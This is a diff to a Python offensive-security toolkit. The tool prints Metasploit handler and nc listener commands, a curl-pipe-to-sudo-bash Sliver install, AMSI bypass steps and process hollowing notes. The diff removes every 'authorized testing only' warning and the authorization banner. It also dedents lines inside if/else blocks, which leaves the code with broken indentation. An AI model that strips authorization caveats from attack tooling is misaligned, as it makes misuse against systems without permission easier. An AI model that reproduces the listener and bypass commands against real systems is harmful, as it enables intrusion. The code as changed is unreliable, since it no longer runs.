@@ -126,11 +126,11 @@ class AdvancedOffensiveToolkit:
                 # Show listener setup
                 console.print(f"\n[bold yellow]Listener setup:[/bold yellow]")
                 if "meterpreter" in selected_payload:
-                    console.print("msfconsole -q -x \"use exploit/multi/handler; set payload " + selected_payload + f"; set LHOST {lhost}; set LPORT {lport}; exploit\"")
+                console.print("msfconsole -q -x \"use exploit/multi/handler; set payload " + selected_payload + f"; set LHOST {lhost}; set LPORT {lport}; exploit\"")
                 else:
-                    console.print(f"nc -nvlp {lport}")
+                console.print(f"nc -nvlp {lport}")
             else:
-                Warning(f"Payload generation failed: {result.stderr}")
+            Warning(f"Payload generation failed: {result.stderr}")
         except Exception as e:
             Warning(f"Error: {e}")
     
@@ -179,7 +179,7 @@ class AdvancedOffensiveToolkit:
                 Success(f"Linux payload generated: {output_file}")
                 console.print(f"\n[bold yellow]Make executable with:[/bold yellow] chmod +x {output_file}")
             else:
-                Warning(f"Generation failed: {result.stderr}")
+            Warning(f"Generation failed: {result.stderr}")
         except Exception as e:
             Warning(f"Error: {e}")
     
@@ -231,7 +231,7 @@ class AdvancedOffensiveToolkit:
                 Success("Sliver is installed and ready")
                 console.print(result.stdout)
             else:
-                Warning("Sliver not found. Install with: curl https://sliver.sh/install|sudo bash")
+            Warning("Sliver not found. Install with: curl https://sliver.sh/install|sudo bash")
                 return
         except FileNotFoundError:
             Warning("Sliver not installed. Install from: https://github.com/BishopFox/sliver")
@@ -439,7 +439,6 @@ class AdvancedOffensiveToolkit:
         console.print("2. Execute your malicious PowerShell commands")
         console.print("3. AMSI will not scan the subsequent commands")
         
-        Warning("These techniques are for authorized testing only!")
     
     def powershell_obfuscation(self):
         """PowerShell obfuscation techniques"""
@@ -513,7 +512,6 @@ class AdvancedOffensiveToolkit:
         console.print("• LOLBAS Project: https://lolbas-project.github.io/")
         console.print("• GTFOBins (Linux): https://gtfobins.github.io/")
         
-        Warning("Use only in authorized environments with proper permissions!")
     
     def process_hollowing(self):
         """Process hollowing technique"""
@@ -534,15 +532,12 @@ class AdvancedOffensiveToolkit:
         console.print("• PowerShell Empire modules")
         console.print("• Metasploit migrate module")
         
-        Warning("Extremely advanced technique - use only in authorized testing!")
     
     def display_menu(self):
         """Display advanced offensive toolkit menu"""
         clear()
         Title("Advanced Offensive Security Toolkit")
         
-        console.print("[bold red]⚠️  AUTHORIZED ENVIRONMENTS ONLY ⚠️[/bold red]")
-        console.print("[dim]For educational labs, CTFs, and authorized testing only[/dim]\n")
         
         console.print("[bold cyan]▸[/bold cyan] Advanced Payload Generation")
         console.print("  [dim cyan]msfvenom, Donut, ScareCrow, custom encoders[/dim cyan]")
